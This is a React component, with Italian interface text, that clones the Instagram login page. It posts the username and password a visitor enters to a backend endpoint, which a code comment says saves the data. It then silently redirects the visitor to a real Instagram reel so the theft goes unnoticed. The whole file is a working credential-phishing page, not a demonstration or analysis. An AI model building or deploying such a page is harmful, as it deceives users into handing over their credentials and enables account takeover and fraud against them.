import React, { useState } from 'react';
import axios from 'axios';


const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      // Simuliamo una richiesta al backend per salvare i dati
      const response = await axios.post('/api/login', {
        username,
        password
      });
      
      // Redirect all'URL del reels che fornirai
      window.location.href = 'https://www.instagram.com/reels/your-reels-id-here/';
      
    } catch (err) {
      setError('Si è verificato un problema durante l\'accesso. Riprova più tardi.');
      console.error('Error:', err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="instagram-container">
      <div className="login-container">
        <div className="form-container">
          <div className="logo-container">
            <img 
              src="/api/placeholder/175/51" 
              alt="Instagram" 
              className="instagram-logo" 
            />
          </div>
          
          <form onSubmit={handleSubmit}>
            <div className="input-container">
              <input
                type="text"
                placeholder="Numero di telefono, nome utente o email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
            </div>
            
            <div className="input-container">
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
            </div>
            
            <button 
              type="submit" 
              className={`login-button ${(username && password) ? 'active' : ''}`}
              disabled={!username || !password || loading}
            >
              {loading ? 'Accesso in corso...' : 'Accedi'}
            </button>
          </form>
          
          <div className="divider">
            <div className="line"></div>
            <div className="or">oppure</div>
            <div className="line"></div>
          </div>
          
          <div className="facebook-login">
            <span className="facebook-icon"></span>
            <span>Accedi con Facebook</span>
          </div>
          
          {error && <div className="error-message">{error}</div>}
          
          <div className="forgot-password">
            <a href="#">Password dimenticata?</a>
          </div>
        </div>
        
        <div className="signup-container">
          <p>
            Non hai un account? <a href="#">Iscriviti</a>
          </p>
        </div>
        
        <div className="app-download">
          <p>Scarica l'applicazione.</p>
          <div className="app-links">
            <a href="#" className="app-link">
              <img 
                src="/api/placeholder/136/40" 
                alt="App Store" 
                className="app-store" 
              />
            </a>
            <a href="#" className="app-link">
              <img 
                src="/api/placeholder/136/40" 
                alt="Google Play" 
                className="google-play" 
              />
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;